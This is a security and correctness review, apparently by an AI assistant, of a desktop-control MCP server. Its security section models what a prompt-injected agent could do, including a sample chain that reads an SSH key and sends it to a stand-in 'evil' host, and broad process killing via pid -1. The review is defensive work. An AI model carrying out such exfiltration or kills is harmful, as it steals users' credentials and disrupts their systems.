# computer-use-mcp v7.5.0 (feat/v7.5-agent-desktop, b97de7e): TypeScript review

Repo: /Users/jameskaranja/Developer/projects/mcp-servers/computer-use-mcp. All paths below are relative to it. Read-only review. I did not start the
server, build, or touch the desktop. I ran 136 hermetic unit tests against the existing dist/ (all pass) and one in-process
tools/list with a fake session.

## 0. Headline: why desktop-control shows CONNECTION_CLOSED

ROOT CAUSE (confirmed from Claude Code's own logs, not inferred): `node_modules/` was missing from the repo, so `node dist/server.js`
died at import time with ERR_MODULE_NOT_FOUND, about 0.2-1.6 s after spawn, before serving anything.
- Log: ~/Library/Caches/claude-cli-nodejs/-Users-jameskaranja-Developer-unreal-engine-games/mcp-logs-desktop-control/2026-10-09T07-51-43-915Z.jsonl:
  `Cannot find package 'zod' imported from .../dist/browser-tools.js ... Node.js v25.4.0`, then `Connection failed after 646ms (CONNECTION_CLOSED)`.
- Timeline from the 92 logs in that folder: connected fine through 2026-10-04T05:58Z; every start since 2026-10-04T13:06Z fails with the same
  ERR_MODULE_NOT_FOUND. The repo dir mtime is Oct 4 09:19 local (06:19Z), which fits something deleting node_modules then (git clean -fdx, a manual rm, a
  worktree reset). dist/ and *.node are git-ignored too, so the same event can silently delete those.
- Not a Node 25.4 problem and not a code bug: no engines gate, no top-level await, no native load at import time.
- State right now: node_modules was re-created at 11:10 today (someone ran npm ci while I was reviewing). `import('./dist/server.js')` now succeeds
  and `@modelcontextprotocol/server` 2.0.0 is present. The running Claude session still has the dead connection; it needs a reconnect/restart.
- Fix so it cannot recur silently: see section 7 (items 1 and 2).

## 1. Architecture (15 lines)

1. One Node ESM process (package "type": "module", target ES2022, module Node16). Entry `src/server.ts:470` runs only if `isStdioEntrypoint(argv[1])` (filename suffix test,
   `src/entrypoint.ts:19`); otherwise it exports `createComputerUseServer` / `createComputerUseHttpHandler` for embedding.
2. Transport: `serveStdio(() => createComputerUseServer(), {legacy:'serve'})` from @modelcontextprotocol/server 2.0.0 (supports MCP 2026-07-28 and legacy 2025),
   wrapped by `TasksExtensionTransport` (`src/mcp-tasks.ts:393`) which intercepts tasks/get|update|cancel.
3. `createComputerUseServer` (`server.ts:157`) builds McpServer + McpV71Controller (roots, subscriptions, logging) + `createSession()` + `ToolRegistry`.
4. Tool registration: `defineV7Tools(registry)` (`registry/definitions.ts`, 72 `tool()` calls + `get_tool_metadata` = 73) defines name/description/zod schema;
   `TOOL_CATALOG` (`tool-catalog.ts:116`) is the single source for tier/mutates/focus flags; `registry.define` throws if catalog and definition disagree;
   `registerAll` registers each with the SDK, adds `approval_token` to every mutating tool, adds annotations and `_meta`.
5. Profiles: `core|ax|scripting|windows-admin|full` (COMPUTER_USE_PROFILE max, COMPUTER_USE_ACTIVE_PROFILE start). Default full = 73 tools; core=31, ax=51, scripting=34,
   windows-admin=43 (computed from dist). Tools outside the maximum are never registered; others are enable()/disable()d.
6. Dispatch: every tool call -> `Session.dispatch` (`session.ts:300`): apply schema defaults -> legacy policy (allow/block/sensitive/approval) -> optional elicitation ->
   mutating tools take an in-process queue (`coordinateDesktop`, lock.ts:273) plus a cross-process file lock `/tmp/.computer-use-mcp.lock` -> a chain of handler
   modules (admin, browser, window, agent-desktop, accessibility, spaces, screenshot, input, openai, core) -> audit JSONL line.
7. Native calls: in-process N-API addon (`computer-use-napi.node`, Rust, loaded with createRequire in `native.ts:392`). All calls are SYNCHRONOUS on the Node main thread.
   There is no child-process boundary for input/windows; child processes exist only for run_script/sdef/mdfind/ps (spawn.ts), pbcopy/pbpaste (input-handlers.ts), and the Swift helper.
8. macOS v7.5 helper: `libexec/macos-agent-helper.swift` is compiled on first use by `xcrun swiftc` into ~/Library/Caches/computer-use-mcp/macos-agent-helper-<sha8>
   and called per request (`capture`, `ocr`), JSON on stdout (macos-helper.ts).
9. Screenshots travel as base64 inside MCP `image` content blocks, inline, every time. Files are used only for the helper's temp JPEG/PNG (read, base64-encoded, deleted).
   The last screenshot is cached in memory and exposed via resource computer://screenshot/latest.
10. Results: mix of `okJson` (text JSON + structuredContent) and plain `ok(text)`/ad-hoc `JSON.stringify` (no structuredContent); only some tools have outputSchema (output-schemas.ts).
11. Policy/audit: env-driven (legacy-policy.ts). Default: only the sensitive-app gate (Keychain/Passwords/1Password); audit log on at ~/.computer-use-mcp/audit.jsonl (2.7 MB now).
12. v7.5 extras: window kinds (window-select.ts), user-active guard (user-activity.ts), pid delivery with per-app verification (pid-delivery.ts, input-handlers.ts), key aliases (keys.ts),
    OCR tools (agent-desktop-handlers.ts).
13. Agent console: separate, opt-in. `computer-use-mcp-console` (run-console-host.ts) serves a local HTTP host (127.0.0.1:4517, host/origin validated) and an MCP App UI; the stdio server
    never starts it (runConsole option is not set at server.ts:471). Four run tools + RunStore (agent-run.ts) only when `runConsole: true`.
14. Client library: `src/client.ts` (`connectStdio`, `connectInProcess`) gives a typed wrapper over callTool. It has not been updated for v7.5 (see 4.9).
15. dist/ is built by `npm run build:ts` = `scripts/clean-dist.mjs` (rm -rf dist) then `tsc`. `.mcp.json` runs `node .../dist/server.js` directly, so a rebuild or a missing build is live-breaking.

## 2. Startup and connection robustness

What can make the process exit or close stdio right after spawn (ordered by likelihood in this setup):
1. Missing dependencies/dist/native (this incident). ESM static imports at `server.ts:6-42` fail before any stderr banner. No launcher, no preflight, no actionable message
   except Node's own stack in the MCP log.
2. Bad numeric env crashes at import: `server.ts:86-90` builds a module-level `McpTaskManager` from `Number(process.env.COMPUTER_USE_MAX_TASKS ?? 16)` etc. `Number('')`=0 and
   `Number('abc')`=NaN both throw "Task limits must be positive integers" (`mcp-tasks.ts:127-129`). An empty string from a config template (`"COMPUTER_USE_TASK_TTL_MS": ""`) kills the server on import.
3. `isStdioEntrypoint` (`entrypoint.ts:19`) is a filename suffix test (`/server.ts|/server.js|/computer-use-mcp`). If argv[1] is anything else (a wrapper script, `server.mjs`,
   a renamed copy, a symlink named differently, `node --import x loader.js`), the module imports cleanly and exits 0 with no output: the host sees CONNECTION_CLOSED. The robust helper
   `isModuleEntrypoint` (realpath compare, entrypoint.ts:44) exists but is used only by http.ts and run-console-host.ts. The file's own comment describes this exact failure mode.
4. Native load failure (`session.ts:172` -> `native.ts:392-395`): missing/wrong-arch/unsigned/quarantined `.node`, or an old .node missing newer exports. Thrown inside the serveStdio factory.
   The SDK factory is invoked lazily on first message, so this likely shows as a JSON-RPC error or onerror log rather than an immediate exit, but the server is unusable either way, and the cause is only in stderr.
   `native.ts:92` gives a good message when the file is absent; nothing handles dlopen errors specially.
5. `createSession` side effects at construction (`session.ts:200-214`): starts the native physical-input monitor (`userGuard.activity()`), registers a process 'exit' listener, creates the pid store.
   On macOS this needs Input Monitoring; if the native call throws it is swallowed in user-activity.ts:75, so it degrades, not crashes. But the first call blocks inside native code with no timeout.
6. No global `uncaughtException`/`unhandledRejection` handler anywhere in src/. On Node >=15 an unhandled rejection exits the process mid-session (also reads as CONNECTION_CLOSED later). Fire-and-forget promises:
   `registry.ts:209` (`void this.#options.onProfileChanged?.()`; its body awaits `mcp.log`, not wrapped in try at server.ts:267), `mcp-v7.1.ts:41` is guarded, `mcp-tasks.ts:253` is guarded.
7. Console port in use: not applicable to stdio (console is a separate binary; `http.ts:15-19` and `run-console-host.ts` only matter if you run those).
   `http.ts` does throw at import for a bad COMPUTER_USE_HTTP_HOST/PORT, so importing `./http` as a library with a bad env also crashes.
8. Node version gates: package.json `engines: node >=20`; no runtime check. Node 25.4 itself is not implicated: nothing in src uses removed APIs. CI test job runs on Node 20 only; the install-matrix job
   covers 20/22/24/current but only `import()`s entry points, so it never exercises `serveStdio` startup on 25.
9. Build race: `build:ts` deletes dist/ before tsc runs (`scripts/clean-dist.mjs`). Any session that starts during the 5-15 s rebuild (or after a failed build) gets missing-module exits.
10. stdout hygiene is fine: no console.log in the stdio path (only run-console-host.ts CLI). Banner goes to stderr (`server.ts:477`).
11. Elicitation failure mode: `server.ts:238` swallows every elicitInput error and returns false (denied) after a 60 s timeout, so an approval-required call can hang 60 s then say denied with no reason.

## 3. Correctness bugs (evidence)

Severity: H = data loss / wrong target / hang, M = wrong result, L = cosmetic or edge.

H1. `process_kill` can signal every process. `registry/definitions.ts:413` `pid: z.number().int()` has no minimum, and `session/admin-handlers.ts:239` does `process.kill(pid, signal)`.
    pid -1 is kill(-1, SIGKILL) in POSIX terms (all processes you may signal, including Claude and the editor); negative pids signal process groups. `0` is falsy so it falls to "name or pid required".
    Also `admin-handlers.ts:240` `pkill -15|-9 <name>` treats `name` as an unanchored regex over process names (name ".", ".*" or "Unreal" kills matches broadly; no `-x`). No approval by default.
H2. `hold_key` blocks the whole server. `definitions.ts:177-179` `duration: z.number().positive()` has no max (wait has max 300). `input-handlers.ts:458` calls the synchronous native `holdKey(keys, duration*1000)`;
    native/src/keyboard.rs:778 sleeps in the addon (interruptible only by emergency stop). The Node event loop (MCP pings, cancellation, other calls) is frozen for the duration; duration*1000 > 2^31 overflows i32.
H3. prepare_display hide-list race. `session.ts:402` calls `focus.beginDispatch()` for EVERY dispatch and `session.ts:512` reads `focus.hiddenBundleIds()` for every dispatch, but the slot is one shared variable
    (`focus.ts:42`) and observation tools are not serialized (only mutating tools queue, `session.ts:538-543`). With parallel tool calls (Claude Code issues them), a concurrent `screenshot` resets the slot
    before the prepare_display call reads it (the agent never learns which apps to unhide, so the user's apps stay hidden), or a screenshot gets another call's hiddenBundleIds appended.
H4. Guard bypass on destructive window ops: `focus.ts:93` skips the user-active check when the target is already frontmost, but strategy `prepare_display` then hides every other app (`focus.ts:102`)
    while the user is typing. `hide_app`/`unhide_app` (`window-handlers.ts:159-160`) have no guard at all and can hide the app the user is using. `click_element` coordinate fallback
    (`accessibility-handlers.ts:150-152`) moves the real cursor and clicks with no guard when the app is already frontmost.
H5. Helper compile failure cached for 10 minutes by a cancelled call. `macos-helper.ts:157-160` caches the promise from `compile(signal)` using the FIRST caller's abort signal. If that call is cancelled during the
    first compile (3-5 s, up to 180 s), `run()` resolves with code 1 (`macos-helper.ts:84-88`), the result is cached as `{ok:false,'swiftc failed'}` and `failedAt` blocks retries for 10 minutes. read_window_text/click_text/SCK
    capture then fail with helper_unavailable until restart. Fix: compile without the per-call signal.
M1. "Unchanged screenshot" returns the full image again. `screenshot-handlers.ts:117` (SCK) and `:275` (native) return the cached `#lastResult` (image + text) when the hash matches. The unchanged-frame detection
    saves compute only, not tokens; there is also no `previous_hash` argument in the schema even though the spec (R3) says it is kept. Return a text-only "unchanged since last capture (hash)" result.
M2. Sensitive-value redaction false positives hide data from the agent. `accessibility-handlers.ts:37` `SENSITIVE_ROLE = /pass(word|code)?|secure|credential|one.?time|otp|pin|cvv|cvc/i` is applied to role AND label,
    unanchored. Verified in node: "Shipping address", "Compass", "Opinion", "Footprint", "Spinner", "Mapping", "Pinned tabs", "Passenger" all match, so their `value` is nulled in get_ui_tree/find_element/get_focused_element.
    Same over-match in the audit redactor (`legacy-policy.ts:231`: keys containing "pin"/"otp", e.g. mapping, shipping).
M3. Implicit sticky target. `target-state.ts:46` falls back to the last target for `type`/`key`/clicks with no target args, and `focus.ensure` (strict for type/key) then re-activates that app. After an
    agent works in app A, a bare `key` can steal focus back to A while the user is in B. `screenshot` with no args silently returns only the remembered window (`screenshot-handlers.ts:74`) and there is no
    argument to say "whole screen"; `zoom` with no target does use the whole screen (inconsistent).
M4. Display/Retina/multi-monitor gaps. (a) `screenshot` has no display parameter; native macOS capture is `screencapture -x` (main display only, native/src/screenshot.rs:431). `snapshot.display` (`definitions.ts:234`)
    is advertised but never read (grep: no `args.display` anywhere). (b) `#describeCapture` (`screenshot-handlers.ts:205-237`) and the zoom fallback (`:174-179`) use `getDisplaySize()` (main display) for every window.
    (c) `looksLikeScreen` aspect test (`:210`) labels a maximized window with the screen's aspect ratio as a whole-screen capture with zero offset. (d) Fullscreen zoom without target crops an un-resized
    capture by pixel coordinates (`screenshot-handlers.ts:299-317`) while click coordinates are points; on Retina this is 2x off with no mapping text (not verified on a Retina display, none here). The SCK window path itself is correct.
M5. `resize_window` on macOS ignores `window_id` (`window-handlers.ts:207-216`: only `window_name`, else "front window of the frontmost app", which may be the agent host terminal). The schema says window_id takes precedence.
M6. Inconsistent coordinate validation: `scroll` (`input-handlers.ts:378`), `left_mouse_down/up` (`:352`) and `multi_*` skip `#validateCoordinates`; click/move/drag validate. `mouse_drag` focuses before checking `path` (`:478-480`),
    and clicks run focus before validating (`input-handlers.ts:238-240`).
M7. Cross-process lock fails instead of waiting. `session.ts:387-394` returns `locked_by_pid` immediately when another Claude session holds `/tmp/.computer-use-mcp.lock`; no wait/retry hint. The in-process queue
    (`lock.ts:273`) waits correctly, so behaviour differs by process. Lock is global to the machine and lives in world-writable /tmp (`lock.ts:12`): another local user can pre-create it and a live foreign PID is never reclaimed (by design, `lock.ts:121`).
M8. Roots deny-by-default window. `mcp-v7.1.ts:71-76` sets clientRoots=[] while refreshing and leaves it empty if `listRoots` fails (10 s timeout), so `filesystem` returns `fs_root_denied` for every path
    on a roots-capable client until the next refresh. This is also why the `filesystem` tool may refuse paths outside the project folder under Claude Code.
M9. Pid delivery: first call to an app costs ~0.5 s+ of extra captures and sleeps (`input-handlers.ts:181-189`), and a false `no_visible_change` (a click that legitimately changes nothing) keeps the app flagged unknown
    forever. Pid records are cached in memory per process and written whole to one JSON (`pid-delivery.ts:96-98`): two server processes overwrite each other's records.
M10. OpenAI adapter does not map coordinates. `session/openai-compat.ts` passes model coordinates straight to point-based tools; screenshots default to 1024 px wide (`constants.ts`), so on a 2560-wide display
    every click lands 2.5x off unless the caller sets width=display width. Only text hints exist in the screenshot reply.
L1. `type` caret_position uses Home/End (`input-handlers.ts:393-396`), which on macOS jump to document start/end, not line start/end.
L2. `#pasteText` (`input-handlers.ts:659-691`) saves clipboard as text via pbpaste: an image/file clipboard is replaced by an empty string on restore.
L3. `DESKTOP_STATE_MUTATIONS` (`server.ts:55`) omits `click_text`, so computer://frontmost/windows subscribers are not notified after it.
L4. `fs-jail.ts:60` `isWithin` breaks for a root of `/` (`'/'+'/'`). `filesystem` `move` across volumes throws raw EXDEV (`admin-handlers.ts:157`).
L5. scrape reads the full body before slicing to 8000 chars (`admin-handlers.ts:326-332`), no size cap; User-Agent still says 7.0.0 (`:323`).
L6. Two copies of the approval message builder (`server.ts:134` and `registry.ts:118`).

## 4. Design issues for agent use

1. Token cost of tools/list. In-process measurement (fake session, `connectInProcess`): 73 tools = 104,806 bytes JSON, about 26-29k tokens before the first call. Biggest: openai_computer 3.0 KB, type 3.0 KB, key 2.6 KB,
   mouse_drag 2.5 KB, scroll 2.5 KB, left_click 2.4 KB. Repeated `target_app/target_window_id/focus_strategy/force/delivery/target_title` descriptions on ~20 tools dominate. macOS gets dead tools:
   `registry`, `notification` (Windows only), `openai_computer`, 6 Spaces tools, `scrape/web_search/browser_*`. Use COMPUTER_USE_PROFILE=core (31 tools) for agents or filter by platform.
2. Screenshots are always inline base64 (no file-path mode). The SCK path returns a JPEG at width 1024 by default; `zoom` defaults to PNG (`definitions.ts:111`), which for large regions is multi-MB. A `path` return option
   (write to a temp file, return path + mapping) would let agents decide what to load. The mapping text after each image is good (SCK path: exact, `screenshot-handlers.ts:130-135`).
3. Result shapes are inconsistent. okJson with structuredContent: list_windows, get_window, get_display_size, get_frontmost_app, snapshot, OCR tools. Plain `ok(JSON.stringify(..))` with no structuredContent: list_running_apps,
   list_displays, get_cursor_window, get_ui_tree, find_element, activate_app, run_script (raw stdout). Prose success with failure inside: `open_application` returns "Opened X (activated: false)" as success
   (`window-handlers.ts:148`), `hide_app` returns "App not found" as non-error (`:159`). Errors are a mix of `Error: msg`, `{error:..}` JSON, FocusFailure JSON, `Unknown tool`.
4. Errors that do not name the fix: `locked_by_pid` (no retry hint), `Invalid coordinate: expected [number, number]` (bare Error, `input-handlers.ts:258`), `Coordinates (x,y) are outside display bounds` (no display list),
   `No coordinates resolved. Provide locs or valid labels.`, `get_window` "Window not found". On the other hand `UnknownKeyError` dumps ~200 key names (about 600 tokens) on every typo (`keys.ts:60`): list the 5 nearest instead.
5. Overlapping tools an agent must choose between: screenshot/zoom/snapshot/read_window_text; click_element/press_button/click_text/left_click; type/set_value/fill_form/multi_edit; activate_app/open_application/activate_window;
   get_ui_tree/find_element/get_app_capabilities/get_tool_guide; list_windows/get_window/get_cursor_window. `get_tool_guide` and the server instructions push "ax first, screenshot last", which is the opposite of the
   v7.5 value for Unreal/Blender (OCR).
6. Stale server instructions (`src/instructions.ts`): no mention of read_window_text, click_text, wait_for_window, delivery, force/user_active, window kinds; says "macOS and Windows" (Linux exists); says "Always set target_app".
   v7.5 behaviour (user_active refusals, pid delivery) is invisible until an agent hits it.
7. Missing waits/polls: no "wait until text appears" (poll read_window_text), no "wait until pixels settle" (screenshot hash), no click-and-verify. Agents sleep with `wait` then re-screenshot. wait_for_window is the only poll.
8. Agents must guess: coordinate units (points vs screenshot pixels; the OpenAI adapter and plain zoom differ), whether `scroll amount` is lines or pixels, which display, what "frontmost" means after pid delivery,
   `force` meaning two things (user-active override on input tools, SIGKILL on process_kill, `definitions.ts` forceParam vs process_kill force).
9. client.ts drift: no wrappers for read_window_text, click_text, wait_for_window; no `force`, `delivery`, `target_title`; `runScript` type omits 'bash'; hard-coded client version 2.0.0; duplicate ToolResult type.
10. user_active refusal is good (`user-activity.ts:97-102` names wait time, pid option, force), but it fires before argument validation and also for pure no-op arg errors.
11. Profiles default to `full` (73 tools including filesystem/run_script/process_kill/scrape). For desktop-control in a games workspace, `core` plus read_window_text is enough and 60% cheaper.

## 5. Test coverage

- 51 files, ~10.3k lines, 487 `test()` calls (tasks.md claims 490 total, 1 skipped). Framework: node:test + fast-check in devDependencies. Tests run against `dist/` (so `npm test` runs `build:ts` first,
  which deletes dist).
- Strong: pure logic with fake natives: keys, window-select, OCR box mapping, text matching, pid routing/verification, user-active guard with fake clock, policy, fs-jail incl. TOCTOU, lock/pump, tool catalog/registry parity,
  MCP 2026 envelope/tasks/approval flows. I ran 15 of these files (v7.5-*, input, focus, target-state, screenshot, legacy-policy, entrypoint, native-resolver, admin, fs-jail, lock-pump): 136/136 pass, 1.1 s.
- Real-process coverage: one stdio test spawns the real `dist/server.js` (mcp-2026.test.mjs:252, tasks lifecycle, 2026 envelope only). `stdio.test.mjs` uses a fixture with a fake session. No test does a
  legacy 2025 `initialize` handshake against the real entrypoint, none checks the "bad env"/"wrong argv[1]"/"missing native" startup failures, none runs on Node 25 (CI test job pins Node 20).
- Not covered / mocked away: the Swift helper (fake runner only; the Swift code has no tests), real SCK/Vision, CGEventPostToPid, the native input monitor, multi-display and Retina geometry, hold_key blocking,
  parallel dispatch races (H3), `process_kill` argument edge cases (H1), helper-compile-cancel (H5), SENSITIVE_ROLE false positives (M2), loadNative dlopen failure.
- CI (.github/workflows/ci.yml): builds native for 6 targets, lints (eslint type-checked, no-floating-promises on), runs `node --test test/*.test.mjs` on macOS arm64, Windows x64/arm64, Linux x64/arm64 with the real binary,
  packs and imports entry points on Node 20/22/24/current, and stages the npm release with provenance. macOS-only paths run on the macos-14 runner but without Screen Recording/Accessibility/Input Monitoring, so
  real capture/OCR/pid delivery are never exercised. Docs spec Blender pid spike still marked pending (design.md section 6).
- Hermeticity: most unit tests inject a fake native; tests that call `createComputerUseServer()` without a session (mcp-2026 stdio, smoke-*.mjs, cancellation, progress) load the REAL addon and start the input monitor.
  Fine in CI, not hermetic locally. smoke-new-tools.mjs/smoke-windows.mjs are explicit live checks.

## 6. Security (what a prompt-injected agent can do)

Default posture is permissive by design (AGENTS.md says so). With no env configuration an injected agent can:
- Run arbitrary code: `run_script` (applescript/javascript/bash/powershell) with the host user's rights; env is sanitized of secret-shaped vars (`spawn.ts:42-63`) but the script can read files, keychain CLI, ssh keys.
- Read/write/delete any file the user can: `filesystem` (read has no size cap, `admin-handlers.ts:124`; delete recursive on any absolute path; write 0600). Jail only if COMPUTER_USE_FS_ROOTS is set
  or the MCP client advertises roots (then deny-by-default while refreshing, M8).
- Exfiltrate without any approval: `scrape` is non-mutating, ungated, follows redirects, no SSRF/host rules (localhost, 169.254.169.254, LAN), so "read ~/.ssh/id_ed25519 via filesystem, then scrape https://evil/?d=..." needs
  zero approvals. `read_clipboard` is also ungated (clipboard often holds passwords). `web_search` can carry data in the query.
- Kill processes (H1) and hide the user's windows (H4).
- Screenshot or OCR anything on screen, including password managers when `target_app` is omitted: sensitive-app gating only matches an explicit `target_app`/`window_id`/`bundle_id`
  (`legacy-policy.ts:161,197`) with case-sensitive exact bundle IDs; the default list is 4 IDs (no Bitwarden, KeePassXC, Dashlane, LastPass, browser password pages). A full-screen capture or `read_clipboard` is not gated.
- Drive the physical keyboard/mouse (Cmd+Space, terminal commands) anywhere, subject only to the 4 s user-active guard, which `force:true` skips; `force` is an agent-supplied argument, so the guard
  protects the user's typing but is not a security control.
Guards that exist and work: sensitive-app approval (token compared in constant time, `legacy-policy.ts:215`; or elicitation), optional allow/block lists, destructive-approval switch, audit log (0600, args redacted,
result text HMAC'd with a per-process random key so digests cannot be correlated across restarts, `legacy-policy.ts:124,251`), script env sanitising, fs jail with O_NOFOLLOW and inode recheck (fs-jail.ts:154-272),
HTTP runner bound to loopback with Host/Origin validation (`http.ts:15,27-28`; console likewise), browser DOM tier off by default with URL secret redaction and credential-site blocklist,
process-tree kill on timeout/abort/8 MB output (`spawn.ts`). Note the allowlist (COMPUTER_USE_ALLOWED_APPS) applies only to `mutates` tools (`legacy-policy.ts:185`), so reads of any app stay open.
Other: `pkill name` regex (H1), `hold_key` DoS (H2), `/tmp` lock file squatting (M7), the Swift helper is built with `xcrun swiftc` from a source file inside the package and ad-hoc signed
(supply chain = the installed package; the cached binary name includes the source sha, good), `scrape`/`web_search` outputs are labelled untrusted but returned as ordinary text.

## 7. Top 15 improvements, ranked (S <= half day, M ~ 1-2 days, L > 2 days)

1. [S] Self-healing launcher: replace `node dist/server.js` in consumers with `bin/launch.mjs` (new, small) that checks `node_modules/@modelcontextprotocol/server`, `dist/server.js`, and the .node file, runs `npm ci`
   (or prints one line telling the user what to run) and then `await import('../dist/server.js')`. Also catches ERR_MODULE_NOT_FOUND. Files: new `bin/launch.mjs`, package.json `bin`, workspace `.mcp.json`.
2. [S] Make the build non-destructive: `scripts/clean-dist.mjs` -> build into `dist.tmp` and rename on success (or `tsc --outDir` swap). Add a `postinstall`/`prepare` that runs build:ts when dist is missing in a git checkout.
   Files: `scripts/clean-dist.mjs`, package.json.
3. [S] Fix startup crashes from env and argv: validate task env with a parse helper that falls back to defaults on ''/NaN/<1 (`server.ts:86-90`); use `isModuleEntrypoint(import.meta.url, argv[1])` for the stdio branch
   (`server.ts:470`) and print a stderr line when argv[1] looks wrong; add `process.on('unhandledRejection'/'uncaughtException')` logging to stderr without exiting. Files: `src/server.ts`, `src/entrypoint.ts`.
4. [S] Harden `process_kill`: require `pid > 1` (reject negatives/0/1/own pid and the host's parent pid), use `pkill -x` (or resolve to pids via `ps` and kill them one by one with a cap), add `max(2^31-1)`.
   Files: `src/session/admin-handlers.ts:225-243`, `src/registry/definitions.ts:413`.
5. [S] Bound `hold_key` and other native blockers: `max(10)` on `duration`, `max` on `timeout_ms`, and run holdKey via a chunked sleep loop on the event loop (press, await sleepAbortable, release in `finally`) instead of one
   blocking native call. Files: `src/registry/definitions.ts:177-179,215,220`, `src/session/input-handlers.ts:450-462`.
6. [M] Cut the tools/list cost: platform-filter dead tools at registration (registry/notification off Windows, OCR/pid tools off macOS), factor repeated param descriptions to one-liners, drop `openai_computer` from default
   profile, and make the default profile `core`+OCR for new installs. Target under 12k tokens. Files: `src/registry/registry.ts:267`, `src/registry/definitions.ts`, `src/tool-catalog.ts`.
7. [S] Screenshot "unchanged" short-circuit that actually saves tokens + `full_screen: true` / `display_id` args: return a text-only result when hash matches; add an explicit way to bypass the remembered window.
   Files: `src/session/screenshot-handlers.ts:117,275,68-76`, `src/registry/definitions.ts:screenshot`.
8. [S] Fix the dispatch-scoped focus state race (H3): make `hiddenBundleIds` a per-dispatch value (return it from `ensure`, or key by an AsyncLocalStorage/call id) and only call `beginDispatch` for mutating tools.
   Files: `src/session/focus.ts:42,83`, `src/session.ts:402,512`.
9. [S] Compile-helper must not inherit a per-call abort signal; cache only success and real swiftc failure. Files: `src/session/macos-helper.ts:124-170`.
10. [M] Close the exfiltration/read gaps by default: gate `read_clipboard` and full-screen captures of sensitive apps (focus-app check via `getFrontmostApp` when no target), add host/IP rules to `scrape`
    (no loopback/link-local/RFC1918 unless COMPUTER_USE_SCRAPE_ALLOW), cap `filesystem read` size, extend default credential-app list, make allowlist apply to reads when set.
    Files: `src/session/legacy-policy.ts`, `src/session/admin-handlers.ts:124,301-336`.
11. [S] Tighten sensitive-value detection: anchor on role (`AXSecureTextField`) and whole-word label match (`\b(password|passcode|otp|cvv|cvc|pin)\b`), same for the audit redactor. Add unit tests with
    "Shipping address", "Compass". Files: `src/session/accessibility-handlers.ts:37`, `src/session/legacy-policy.ts:231`.
12. [M] User-active guard coverage: apply to `hide_app`, `unhide_app`, `prepare_display` when target is frontmost, and the click_element coordinate fallback; fix `resize_window` to honour `window_id` on macOS.
    Files: `src/session/window-handlers.ts:159-160,207`, `src/session/focus.ts:93`, `src/session/accessibility-handlers.ts:147-155`.
13. [M] Refresh agent-facing docs in code: rewrite `SERVER_INSTRUCTIONS` for v7.5 (OCR first for custom-UI apps, user_active, delivery, wait_for_window), add `structuredContent` to every result, replace the 200-key dump with nearest-5,
    add retry hints to `locked_by_pid` and wait-then-fail with a short queue for the cross-process lock. Files: `src/instructions.ts`, `src/session/keys.ts:57-65`, `src/session.ts:387-394`, `src/session/window-handlers.ts`.
14. [M] Tests for what failed in production: real-entrypoint stdio test with a legacy 2025 initialize, bad-env and missing-native startup cases, parallel dispatch race, process_kill/hold_key schema limits;
    run the CI test job on Node 22 and 25; extend `package` job with `files` completeness. Files: `test/`, `.github/workflows/ci.yml`.
15. [S] Packaging robustness: `package.json` `files` lists ~70 individual `dist/*.js` entries, so a new top-level src file is silently omitted from the npm tarball (the package CI job only asserts a hand-maintained subset).
    Use `"files": ["dist/", ...]` and delete tests/maps, update client.ts for v7.5 tools. Files: `package.json`, `src/client.ts`.

## Spec vs code (docs/specs/v7.5-agent-desktop)

Matches: R1 window choice/kinds, R2 OCR tools (boxes correct incl. --region origin handling in the Swift helper), R3 SCK capture with exact mapping and screencapture fallback, R4 guard on HID/activation tools,
R5 pid delivery with per-class verification and auto routing, R6 key aliases and type mode:"keys", R7 wait_for_window. Deviations or gaps:
- R3 says `previous_hash` short-circuits unchanged frames: no such argument; the cached result is resent in full (M1).
- R4 "reads never blocked" true, but hide_app/unhide_app/prepare_display and the click_element fallback are not guarded (H4); the spec's list of guarded paths omits them.
- R1 says `zoom`/`snapshot` accept `target_app`: true; but `snapshot.display` is advertised and ignored.
- tasks.md/design.md status lines say "uncommitted"; the work is committed (b97de7e). Blender pid spike still pending as recorded. Task list claims 490 tests; 487 `test()` calls counted.
- Windows/Linux compatibility claim: the user guard is off by default there (documented); `click_text`/`read_window_text` return platform_unsupported (documented).
